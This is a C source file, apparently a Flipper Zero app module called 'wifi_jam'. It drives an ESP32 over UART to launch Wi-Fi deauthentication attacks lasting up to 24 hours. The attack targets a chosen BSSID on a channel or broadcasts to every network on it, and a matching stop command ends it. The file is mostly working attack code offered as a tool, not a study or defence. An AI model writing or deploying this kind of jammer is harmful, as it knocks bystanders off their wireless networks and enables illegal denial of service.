#include "wifi_jam.h"
#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_serial_control.h>
#include <expansion/expansion.h>
#include <string.h>
#include <stdio.h>

#define WIFI_SERIAL_ID   FuriHalSerialIdLpuart
#define WIFI_BAUD_RATE   115200

static FuriHalSerialHandle* s_serial = NULL;

static void uart_tx_str(const char* str) {
    if(!s_serial) return;
    furi_hal_serial_tx(s_serial, (const uint8_t*)str, strlen(str));
}

void wifi_jam_init(void) {
    // Expansion-Modul deaktivieren: verhindert UART-Protokoll-Konflikt
    Expansion* expansion = furi_record_open(RECORD_EXPANSION);
    expansion_disable(expansion);
    furi_record_close(RECORD_EXPANSION);

    s_serial = furi_hal_serial_control_acquire(WIFI_SERIAL_ID);
    furi_hal_serial_init(s_serial, WIFI_BAUD_RATE);
    furi_delay_ms(100); /* ESP32 settle */
}

void wifi_jam_start(uint8_t channel, bool broadcast, const char* bssid) {
    char json[128];

    if(broadcast || channel == 0) {
        snprintf(json, sizeof(json),
            "{\"cmd\":\"deauth\",\"ch\":%u,\"bcast\":true,\"dur\":86400000}\n",
            (unsigned)channel);
    } else {
        snprintf(json, sizeof(json),
            "{\"cmd\":\"deauth\",\"ch\":%u,\"bssid\":\"%s\",\"bcast\":false,\"dur\":86400000}\n",
            (unsigned)channel,
            bssid ? bssid : "FF:FF:FF:FF:FF:FF");
    }

    uart_tx_str(json);
}

void wifi_jam_stop(void) {
    uart_tx_str("{\"cmd\":\"stop\"}\n");
    furi_delay_ms(50);

    if(s_serial) {
        furi_hal_serial_deinit(s_serial);
        furi_hal_serial_control_release(s_serial);
        s_serial = NULL;
    }

    Expansion* expansion = furi_record_open(RECORD_EXPANSION);
    expansion_enable(expansion);
    furi_record_close(RECORD_EXPANSION);
}
